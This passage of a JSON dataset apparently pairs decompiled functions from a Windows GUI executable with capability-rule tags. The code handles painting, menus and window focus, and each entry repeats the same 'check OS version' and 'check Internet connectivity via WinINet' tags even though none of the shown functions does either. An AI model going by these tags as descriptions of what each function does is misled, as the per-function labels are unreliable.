}\n            if ((*(in_EAX + 0x98) & 8) != 0) {\n                uVar2 = sub.kernel32.dll_MulDiv();\n                *(in_EAX + 0x26c) = uVar2;\n            }\n            if ((*(in_EAX + 0x98) & 0x20) != 0) {\n                uVar2 = sub.kernel32.dll_MulDiv(*(in_EAX + 0x1fa), iVar3, *(in_EAX + 0x270));\n                *(in_EAX + 0x1fa) = uVar2;\n                uVar2 = sub.kernel32.dll_MulDiv();\n                *(in_EAX + 0x1fe) = uVar2;\n            }\n        }\n    }\n    if (0 < *(in_EAX + 0x268)) {\n        fcn.00438f48();\n    }\n    if (0 < *(in_EAX + 0x26c)) {\n        fcn.00438f8c();\n    }\n    *(in_EAX + 0x98) = *0x452430;\n    if (!bVar1) {\n        fcn.0045182c();\n        fcn.0043f7cc();\n    }\n    uVar2 = 0;\n    fcn.0043a6d4(0);\n    *in_FS_OFFSET = uVar2;\n    fcn.0043c5a8(0x452429);\n    return;\n}\n",
        "token_count": 839
    },
    "004525fc": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.004525fc(void)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    uint uVar2;\n    int32_t iVar3;\n    \n    if (**0x461fc0 == '\\0') {\n        uVar2 = fcn.0043fd08();\n        iVar3 = sub.user32.dll_IsIconic(uVar2);\n        if (iVar3 != 0) {\n            (**(*in_EAX + 0x7c))();\n        }\n    }\n    else {\n        cVar1 = fcn.0044000c();\n        if ((cVar1 != '\\0') && (*(in_EAX + 0x229) != '\\x03')) {\n            uVar2 = fcn.0045495c();\n            uVar2 = fcn.0043fd08(0x80, 1, uVar2);\n            sub.user32.dll_SendMessageA(uVar2);\n            return;\n        }\n    }\n    return;\n}\n",
        "token_count": 212
    },
    "00452668": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint fcn.00452668(void)\n\n{\n    int32_t in_EAX;\n    \n    if (((*(in_EAX + 0x210) == '\\0') && (*(*(in_EAX + 0x208) + 0x10) == 0)) && (*(*(in_EAX + 0x20c) + 0x10) == 0)) {\n        return 0;\n    }\n    return 1;\n}\n",
        "token_count": 96
    },
    "004529a4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.004529a4(void)\n\n{\n    int32_t in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack20;\n    uint uStack16;\n    uchar *puStack12;\n    uint var_4h;\n    \n    puStack12 = &stack0xfffffffc;\n    var_4h = 0;\n    uStack16 = 0x4529fd;\n    uStack20 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffec;\n    if ((*(in_EAX + 0x22f) == '\\x01') && (*(in_EAX + 0x57) != '\\0')) {\n        fcn.00405b0c();\n        fcn.0040b538();\n        fcn.004039e4();\n    }\n    *in_FS_OFFSET = uStack20;\n    puStack12 = 0x452a04;\n    uStack16 = 0x4529fc;\n    fcn.00403fa8();\n    return;\n}\n",
        "token_count": 220
    },
    "00452a44": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00452a44(uint arg_8h)\n\n{\n    int32_t in_EAX;\n    \n    fcn.0041998c(arg_8h);\n    if (*(in_EAX + 0x250) != 0) {\n        (**(**(in_EAX + 0x250) + 0x2c))(arg_8h);\n    }\n    return;\n}\n",
        "token_count": 88
    },
    "00452a84": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00452a84(uint param_1, int32_t *param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t *piVar2;\n    int32_t *piVar3;\n    uint uVar4;\n    int32_t iVar5;\n    int32_t **in_FS_OFFSET;\n    int32_t *piStack80;\n    uint uStack76;\n    uchar *puStack72;\n    int32_t *piStack64;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar5 = *param_2;\n    if (iVar5 < 0x47) {\n        if (iVar5 == 0x46) {\n            if (*0x452eb8 == (*(in_EAX + 0x1c) & *0x452eb4)) {\n                if ((*(in_EAX + 0x230) - 1U < 2) && (*(in_EAX + 0x22b) != '\\x02')) {\n                    *(param_2[2] + 0x18) = *(param_2[2] + 0x18) | 2;\n                }\n                if (((*(in_EAX + 0x230) == '\\x01') || (*(in_EAX + 0x230) == '\\x03')) &&\n                   ((*(in_EAX + 0x229) == '\\x02' || (*(in_EAX + 0x229) == '\\x05')))) {\n                    *(param_2[2] + 0x18) = *(param_2[2] + 0x18) | 1;\n                }\n            }\n            goto code_r0x00452ea0;\n        }\n        if (iVar5 - 6U < 3) {\n            if (*0x461cd8 == '\\0') {\n                return;\n            }\n            if ((*param_2 == 7) && ((*(in_EAX + 0x1c) & 0x10) == 0)) {\n                iVar5 = 0;\n                if (*(in_EAX + 0x22f) == '\\x02') {\n                    iVar1 = fcn.004533b0();\n                    if (iVar1 != 0) {\n                        fcn.004533b0();\n                        iVar5 = fcn.0043fd08();\n                    }\n                }\n                else if ((*(in_EAX + 0x220) != 0) && (*(in_EAX + 0x220) != in_EAX)) {\n                    iVar5 = fcn.0043fd08();\n                }\n                if (iVar5 != 0) {\n                    sub.user32.dll_SetFocus();\n                    return;\n                }\n            }\n            goto code_r0x00452ea0;\n        }\n        if (iVar5 == 0x2b) {\n            piVar2 = param_2[2];\n            if (((*piVar2 == 1) && (*(in_EAX + 0x248) != 0)) && (iVar5 = fcn.0044cba8(),  iVar5 != 0)) {\n                fcn.0041d20c();\n                *in_FS_OFFSET = &stack0xffffffd0;\n                iVar5 = sub.gdi32.dll_SaveDC();\n                piStack64 = *in_FS_OFFSET;\n                *in_FS_OFFSET = &stack0xffffffc0;\n                fcn.0041d884();\n                fcn.0041d724();\n                piVar2 = piVar2 & 0xffff0000 | *(piVar2 + 4);\n                puStack72 = 0x452cb8;\n                fcn.0044e090(piVar2);\n                *in_FS_OFFSET = piVar2;\n                piStack64 = 0x452ccf;\n                fcn.0041d884();\n                puStack72 = 0x452cdf;\n                piStack64 = iVar5;\n                sub.gdi32.dll_RestoreDC();\n                return;\n            }\n            goto code_r0x00452ea0;\n        }\n        if (iVar5 == 0x2c) {\n            piVar2 = param_2[2];\n            if (((*piVar2 == 1) && (*(in_EAX + 0x248) != 0)) && (piVar3 = fcn.0044cba8(),  piVar3 != NULL)) {\n                fcn.0043fd08();\n                uVar4 = sub.user32.dll_GetWindowDC();\n                *in_FS_OFFSET = &stack0xffffffcc;\n                fcn.0041d20c();\n                piStack64 = *in_FS_OFFSET;\n                *in_FS_OFFSET = &stack0xffffffc0;\n                puStack72 = 0x452d82;\n                iVar5 = sub.gdi32.dll_SaveDC();\n                uStack76 = 0x452de7;\n                piStack80 = *in_FS_OFFSET;\n                *in_FS_OFFSET = &stack0xffffffb0;\n                puStack72 = &stack0xfffffffc;\n                fcn.0041d884();\n                fcn.0041d724();\n                piVar2 = piVar2 + 4;\n                (**(*piVar3 + 0x38))();\n                *in_FS_OFFSET = piVar2;\n                uStack76 = 0x452dee;\n                piStack80 = 0x452dd9;\n                fcn.0041d884();\n                piStack80 = iVar5;\n                sub.gdi32.dll_RestoreDC(uVar4);\n                return;\n            }\n            goto code_r0x00452ea0;\n        }\n    }\n    else {\n        if (iVar5 == 0xb01a) {\n            if (*(in_EAX + 0xa0) != 0) {\n                fcn.00403454();\n            }\n            goto code_r0x00452ea0;\n        }\n        if (iVar5 == 0xb01b) {\n            if (*(in_EAX + 0xa0) != 0) {\n                fcn.00403454();\n            }\n            goto code_r0x00452ea0;\n        }\n    }\n    if (iVar5 == *0x463bbc) {\n        fcn.0043a6d4(0);\n        fcn.0043a6d4(0);\n        fcn.0043a6d4(0);\n        fcn.0043a6d4(0);\n        fcn.0043a6d4(0);\n        piStack64 = 0x452ea0;\n        fcn.0043a6d4(0);\n    }\ncode_r0x00452ea0:\n    piStack64 = 0x452eaa;\n    fcn.0043d71c();\n    return;\n}\n",
        "token_count": 1485
    },
    "00452f48": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00452f48(uint param_1, int32_t *param_2)\n\n{\n    int32_t *in_EAX;\n    uint uVar1;\n    int32_t iVar2;\n    int32_t *in_FS_OFFSET;\n    int32_t in_stack_ffffff6c;\n    int32_t iStack140;\n    uint *puStack136;\n    uchar *puStack132;\n    uint *puStack128;\n    uint var_74h;\n    uint var_70h;\n    uint var_6ch;\n    uint var_5ch;\n    uint var_58h;\n    uint var_4ch;\n    int32_t var_ch;\n    int32_t *var_8h;\n    int32_t *var_4h;\n    \n    iVar2 = *param_2;\n    var_8h = param_2;\n    var_4h = in_EAX;\n    if (iVar2 != 0xf) {\n        if (iVar2 == 0x14) {\n            fcn.0041d0f0();\n            puStack128 = 0x452fb6;\n            (**(*var_4h + 0x44))();\n            puStack128 = &fcn.00452f48::var_6ch;\n            puStack132 = var_8h[1];\n            puStack136 = 0x452fc6;\n            sub.user32.dll_FillRect();\n            if ((*(var_4h + 0x22f) == '\\x02') && (var_4h[0x95] != 0)) {\n                puStack136 = &fcn.00452f48::var_5ch;\n                iStack140 = var_4h[0x95];\n                sub.user32.dll_GetClientRect();\n                uVar1 = fcn.0041d0f0();\n                sub.user32.dll_FillRect(var_8h[1], &fcn.00452f48::var_5ch, uVar1);\n            }\n            var_8h[3] = 1;\n        }\n        else if (iVar2 == 0x3f) {\n            puStack128 = 0x453025;\n            fcn.00452ebc(&stack0xfffffffc);\n            if (*(var_4h + 0x22f) == '\\x02') {\n                iVar2 = fcn.004533e4();\n                if (iVar2 != 0) {\n                    puStack128 = 0x453048;\n                    fcn.00452f08(&stack0xfffffffc);\n                }\n                fcn.00450228();\n            }\n        }\n        else if (iVar2 == 0x84) {\n            puStack128 = 0x452f7f;\n            fcn.00452ebc(&stack0xfffffffc);\n            if (var_8h[3] == 1) {\n                var_8h[3] = -1;\n            }\n        }\n        else {\n            puStack128 = 0x453123;\n            fcn.00452ebc(&stack0xfffffffc);\n        }\n        return;\n    }\n    var_ch = param_2[1];\n    if (var_ch == 0) {\n        puStack128 = in_EAX[0x95];\n        puStack132 = 0x453088;\n        iVar2 = sub.user32.dll_BeginPaint();\n        var_8h[1] = iVar2;\n    }\n    puStack136 = 0x453116;\n    iStack140 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffff74;\n    puStack132 = &stack0xfffffffc;\n    if (var_ch == 0) {\n        in_stack_ffffff6c = var_4h[0x95];\n        puStack132 = &stack0xfffffffc;\n        sub.user32.dll_GetWindowRect(in_stack_ffffff6c, &fcn.00452f48::var_5ch);\n        fcn.00439070();\n        fcn.00437e68();\n    }\n    fcn.0043d9bc();\n    *in_FS_OFFSET = in_stack_ffffff6c;\n    iStack140 = 0x453124;\n    if (var_ch == 0) {\n        sub.user32.dll_EndPaint(var_4h[0x95], &fcn.00452f48::var_4ch);\n    }\n    return;\n}\n",
        "token_count": 948
    },
    "0045322c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.0045322c(void)\n\n{\n    int32_t *in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack20;\n    uint uStack16;\n    uchar *puStack12;\n    int32_t *var_4h;\n    \n    puStack12 = &stack0xfffffffc;\n    if (*(in_EAX + 0x91) == '\\0') {\n        *(in_EAX + 0x91) = 1;\n        uStack16 = 0x4532a9;\n        uStack20 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &uStack20;\n        var_4h = in_EAX;\n        if (*(in_EAX + 0x18) != '\\0') {\n            if (in_EAX[0xc] == 0) {\n                puStack12 = &stack0xfffffffc;\n                (**(*in_EAX + 0x70))();\n            }\n            else {\n                (**(*in_EAX + 0x70))();\n            }\n            (**(*var_4h + 0x6c))();\n        }\n        *in_FS_OFFSET = uStack20;\n        *(var_4h + 0x91) = 0;\n        return;\n    }\n    return;\n}\n",
        "token_count": 273
    },
    "004533b0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint fcn.004533b0(void)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    \n    uVar1 = 0;\n    if ((*(in_EAX + 0x22f) == '\\x02') && (*(in_EAX + 0x254) != 0)) {\n        sub.user32.dll_SendMessageA(*(in_EAX + 0x254), 0x229, 0, 0);\n        uVar1 = fcn.004363b8();\n    }\n    return uVar1;\n}\n",
        "token_count": 121
    },
    "004533e4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nint32_t fcn.004533e4(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    \n    iVar3 = 0;\n    if (((*(in_EAX + 0x22f) == '\\x02') && (*(in_EAX + 0x254) != 0)) && (iVar1 = fcn.00456f54(),  -1 < iVar1 + -1)) {\n        do {\n            iVar2 = fcn.00456f40();\n            if (*(iVar2 + 0x22f) == '\\x01') {\n                iVar3 = iVar3 + 1;\n            }\n            iVar1 = iVar1 + -1;\n        } while (iVar1 != 0);\n    }\n    return iVar3;\n}\n",
        "token_count": 182
    },
    "00453430": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.00453430(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    \n    if (((*(in_EAX + 0x22f) == '\\x02') && (*(in_EAX + 0x254) != 0)) && (iVar1 = fcn.00456f54(),  -1 < iVar1 + -1)) {\n        do {\n            iVar2 = fcn.00456f40();\n            if ((*(iVar2 + 0x22f) == '\\x01') && (param_2 = param_2 + -1,  param_2 < 0)) {\n                return iVar2;\n            }\n            iVar1 = iVar1 + -1;\n        } while (iVar1 != 0);\n    }\n    return 0;\n}\n",
        "token_count": 196
    },
    "004535dc": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004535dc(uint param_1, char param_2)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    \n    if (param_2 != *(in_EAX + 0x22f)) {\n        if ((param_2 == '\\x01') && (*(in_EAX + 0x230) == '\\0')) {\n            fcn.00453940();\n        }\n        if ((*(in_EAX + 0x1c) & 0x10) == 0) {\n            fcn.0043d260();\n        }\n        cVar1 = *(in_EAX + 0x22f);\n        *(in_EAX + 0x22f) = param_2;\n        if (((param_2 == '\\x02') || (cVar1 == '\\x02')) && (*(in_EAX + 0x1a5) == '\\0')) {\n            fcn.004539bc();\n            fcn.004396cc();\n        }\n        if ((*(in_EAX + 0x1c) & 0x10) == 0) {\n            fcn.0043d3fc();\n        }\n        if (param_2 == '\\x01') {\n            fcn.00452960();\n        }\n    }\n    return;\n}\n",
        "token_count": 283
    },
    "0045365c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.0045365c(void)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint uVar4;\n    \n    if ((*(in_EAX + 0x22f) == '\\x02') && (*(in_EAX + 0x254) != 0)) {\n        iVar3 = 0;\n        if (*(in_EAX + 0x248) != NULL) {\n            iVar3 = (**(**(in_EAX + 0x248) + 0x34))();\n        }\n        uVar4 = 0;\n        if (*(in_EAX + 600) != 0) {\n            uVar4 = fcn.00449ce8();\n        }\n        uVar1 = fcn.0043fd08();\n        iVar2 = sub.user32.dll_GetMenu(uVar1);\n        sub.user32.dll_SendMessageA(*(in_EAX + 0x254), 0x230, iVar3, uVar4);\n        if (iVar3 != iVar2) {\n            uVar4 = fcn.0043fd08();\n            sub.user32.dll_DrawMenuBar(uVar4);\n        }\n    }\n    return;\n}\n",
        "token_count": 267
    },
    "00453724": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.00453724(uint param_1, int32_t param_2)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint uVar4;\n    uint *in_FS_OFFSET;\n    uint *arg_ch;\n    uint arg_8h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    arg_8h = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd4;\n    if ((param_2 != 0) && (iVar2 = fcn.00456f54(),  -1 < iVar2 + -1)) {\n        do {\n            var_4h = iVar2;\n            iVar2 = fcn.00456f40();\n            if ((param_2 == *(iVar2 + 0x248)) && (iVar2 = fcn.00456f40(),  in_EAX != iVar2)) {\n                var_ch = *(param_2 + 8);\n                var_8h._0_1_ = 0xb;\n                arg_ch = &var_ch;\n                arg_8h = 0;\n                fcn.00405b0c();\n                fcn.0040b574(arg_8h, arg_ch);\n                fcn.004039e4();\n            }\n            var_4h = var_4h + -1;\n            iVar2 = var_4h;\n        } while (var_4h != 0);\n    }\n    if (*(in_EAX + 0x248) != 0) {\n        fcn.0044d234();\n    }\n    if (((*(in_EAX + 0x1c) & 8) != 0) || ((param_2 != 0 && ((*(param_2 + 0x1c) & 8) != 0)))) {\n        param_2 = 0;\n    }\n    *(in_EAX + 0x248) = param_2;\n    if ((param_2 == 0) || ((fcn.004195ec(),  (*(in_EAX + 0x1c) & 0x10) == 0 && (*(in_EAX + 0x229) == '\\x03')))) {\n        cVar1 = fcn.0044000c();\n        if (cVar1 != '\\0') {\n            uVar4 = fcn.0043fd08(0);\n            sub.user32.dll_SetMenu(uVar4);\n        }\n    }\n    else if (((*(*(in_EAX + 0x248) + 0x5c) == '\\0') && (*(in_EAX + 0x22f) != '\\x01')) ||\n            ((*(in_EAX + 0x1c) & 0x10) != 0)) {\n        cVar1 = fcn.0044000c();\n        if (cVar1 != '\\0') {\n            iVar2 = (**(**(in_EAX + 0x248) + 0x34))();\n            arg_8h = fcn.0043fd08();\n            iVar3 = sub.user32.dll_GetMenu();\n            if (iVar2 != iVar3) {\n                (**(**(in_EAX + 0x248) + 0x34))();\n                arg_8h = fcn.0043fd08();\n                sub.user32.dll_SetMenu();\n            }\n            fcn.0043fd08();\n            fcn.0044d234();\n        }\n    }\n    else if ((*(in_EAX + 0x22f) != '\\x01') && (cVar1 = fcn.0044000c(),  cVar1 != '\\0')) {\n        uVar4 = fcn.0043fd08(0);\n        sub.user32.dll_SetMenu(uVar4);\n    }\n    if (*(in_EAX + 0x22e) != '\\0') {\n        fcn.004547e8();\n    }\n    fcn.0045365c();\n    *in_FS_OFFSET = arg_8h;\n    fcn.00403fa8();\n    return;\n}\n",
        "token_count": 920
    },
    "0045395c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint32_t fcn.0045395c(void)\n\n{\n    uint32_t in_EAX;\n    \n    return in_EAX & 0xffffff00 | *(in_EAX + 0x25c) != 0;\n}\n",
        "token_count": 50
    },
    "00453a58": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00453a58(uint param_1, uint8_t param_2)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    \n    if (((param_2 != *(in_EAX + 0x22b)) && (*(in_EAX + 0x22b) = param_2,  (*(in_EAX + 0x1c) & 0x10) == 0)) &&\n       (*(in_EAX + 0x1a6) != '\\0')) {\n        uVar1 = fcn.0043fd08(*(param_2 * 4 + 0x461d34));\n        sub.user32.dll_ShowWindow(uVar1);\n    }\n    return;\n}\n",
        "token_count": 159
    },
    "00453a98": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.00453a98(void)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint32_t uVar6;\n    int32_t iVar7;\n    int32_t iVar8;\n    uint uVar9;\n    int32_t iVar10;\n    int32_t iVar11;\n    int32_t iStack20;\n    \n    if ((*(in_EAX + 0x231) != '\\0') && (*(*0x463bb0 + 0x44) != 0)) {\n        iVar10 = 0;\n        if (*(in_EAX + 0x231) == '\\x02') {\n            iVar10 = fcn.004534b0();\n            iVar10 = *(iVar10 + 4);\n        }\n        else if ((*(in_EAX + 0x231) == '\\x03') && (*(*0x463bb4 + 0x68) != 0)) {\n            iVar10 = fcn.004534b0();\n            iVar10 = *(iVar10 + 4);\n        }\n        else if (*(in_EAX + 0x231) == '\\x01') {\n            iVar10 = fcn.00456f10();\n            iVar10 = *(iVar10 + 4);\n        }\n        iVar1 = fcn.004534b0();\n        iVar1 = *(iVar1 + 4);\n        iStack20 = fcn.00456f24();\n        if (-1 < iStack20 + -1) {\n            do {\n                iVar2 = fcn.00456f10();\n                if (((*(iVar2 + 4) == iVar10) && (iVar10 != iVar1)) && (iVar2 = fcn.00456f24(),  -1 < iVar2 + -1)) {\n                    iVar11 = 0;\n                    do {\n                        iVar3 = fcn.00456f10(iVar10, iVar1, iVar11);\n                        if (*(iVar3 + 4) == iVar1) {\n                            if (*(in_EAX + 0x8c) == '\\x04') {\n                                iVar3 = in_EAX[0x13];\n                                fcn.00456f10(iVar3, in_EAX[0x12]);\n                                iVar4 = fcn.00456c14();\n                                fcn.00456f10(iVar4);\n                                iVar5 = fcn.00456bf8();\n                                uVar6 = iVar5 - iVar3;\n                                iVar3 = uVar6 >> 1;\n                                if (iVar3 < 0) {\n                                    iVar3 = iVar3 + ((uVar6 & 1) != 0);\n                                }\n                                fcn.00456f10(iVar4 + iVar3);\n                                fcn.00456be0();\n                                fcn.00456f10();\n                                fcn.00456c2c();\n                                (**(*in_EAX + 0x84))();\n                            }\n                            else if (*(in_EAX + 0x8c) == '\\x06') {\n                                iVar3 = in_EAX[0x13];\n                                fcn.00456f10(iVar3, in_EAX[0x12]);\n                                iVar4 = fcn.00456c14();\n                                fcn.00456f10(iVar4);\n                                iVar5 = fcn.00456bf8();\n                                uVar6 = iVar5 - iVar3;\n                                iVar3 = uVar6 >> 1;\n                                if (iVar3 < 0) {\n                                    iVar3 = iVar3 + ((uVar6 & 1) != 0);\n                                }\n                                fcn.00456f10(iVar4 + iVar3);\n                                fcn.00456be0();\n                                fcn.00456f10();\n                                fcn.00456c2c();\n                                (**(*in_EAX + 0x84))();\n                            }\n                            else {\n                                fcn.00456f10(iVar10, iVar1, iVar11);\n                                iVar4 = fcn.00456be0();\n                                iVar3 = in_EAX[0x10];\n                                fcn.00456f10();\n                                iVar5 = fcn.00456be0();\n                                fcn.00456f10();\n                                iVar7 = fcn.00456be0();\n                                fcn.00456f10();\n                                iVar8 = fcn.00456c2c();\n                                if (iVar7 + iVar8 < in_EAX[0x12] + ((iVar4 + iVar3) - iVar5)) {\n                                    fcn.00456f10();\n                                    fcn.00456be0();\n                                    fcn.00456f10();\n                                    fcn.00456c2c();\n                                }\n                                fcn.00456f10();\n                                iVar3 = fcn.00456c14();\n                                iVar3 = iVar3 + in_EAX[0x11];\n                                fcn.00456f10();\n                                iVar4 = fcn.00456c14();\n                                fcn.00456f10();\n                                iVar5 = fcn.00456c14();\n                                fcn.00456f10();\n                                iVar7 = fcn.00456bf8();\n                                if (iVar5 + iVar7 < (iVar3 - iVar4) + in_EAX[0x13]) {\n                                    fcn.00456f10();\n                                    uVar9 = fcn.00456c14();\n                                    fcn.00456f10(uVar9);\n                                    fcn.00456bf8();\n                                }\n                                (**(*in_EAX + 0x84))(in_EAX[0x13], in_EAX[0x12]);\n                            }\n                        }\n                        iVar11 = iVar11 + 1;\n                        iVar2 = iVar2 + -1;\n                    } while (iVar2 != 0);\n                }\n                iStack20 = iStack20 + -1;\n            } while (iStack20 != 0);\n        }\n    }\n    return;\n}\n",
        "token_count": 1295
    },
    "0045414c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0045414c(uint param_1, uint *param_2)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    int32_t iVar2;\n    uint *extraout_EDX;\n    uint *puVar3;\n    uint *in_FS_OFFSET;\n    uint in_stack_ffffff20;\n    uint uStack208;\n    uint uStack204;\n    uchar *puStack200;\n    uint var_b4h;\n    uint var_b0h;\n    uint32_t var_a8h;\n    uint *var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack200 = &stack0xfffffffc;\n    uStack204 = 0x454275;\n    uStack208 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack208;\n    if ((*(in_EAX + 0x22f) == '\\x01') && ((*(in_EAX + 0x1c) & 0x10) == 0)) {\n        if ((*(*0x463bb0 + 0x44) == 0) || (puStack200 = &stack0xfffffffc,  *(*(*0x463bb0 + 0x44) + 0x254) == 0)) {\n            puStack200 = &stack0xfffffffc;\n            fcn.00405b0c();\n            fcn.0040b538();\n            fcn.004039e4();\n            param_2 = extraout_EDX;\n        }\n        var_24h = param_2 + 0x13;\n        var_20h = *param_2;\n        var_1ch = *0x463664;\n        var_18h = param_2[3];\n        var_14h = param_2[4];\n        var_10h = param_2[5];\n        var_ch = param_2[6];\n        var_8h = param_2[1];\n        var_4h = param_2[8];\n        in_stack_ffffff20 = *(*(*0x463bb0 + 0x44) + 0x254);\n        uVar1 = sub.user32.dll_SendMessageA(in_stack_ffffff20, 0x220, 0, &var_24h);\n        *(in_EAX + 0x180) = uVar1;\n        *(in_EAX + 0x2f4) = *(in_EAX + 0x2f4) | 0x10;\n    }\n    else {\n        puVar3 = &var_b0h;\n        for (iVar2 = 0x23; iVar2 != 0; iVar2 = iVar2 + -1) {\n            *puVar3 = *param_2;\n            param_2 = param_2 + 1;\n            puVar3 = puVar3 + 1;\n        }\n        var_a8h = var_a8h & 0xfff7ffff;\n        fcn.0043ce90();\n        *(in_EAX + 0x2f4) = *(in_EAX + 0x2f4) & 0xef;\n    }\n    fcn.00456668();\n    *in_FS_OFFSET = in_stack_ffffff20;\n    fcn.00403fa8(0x45427c);\n    return;\n}\n",
        "token_count": 764
    },
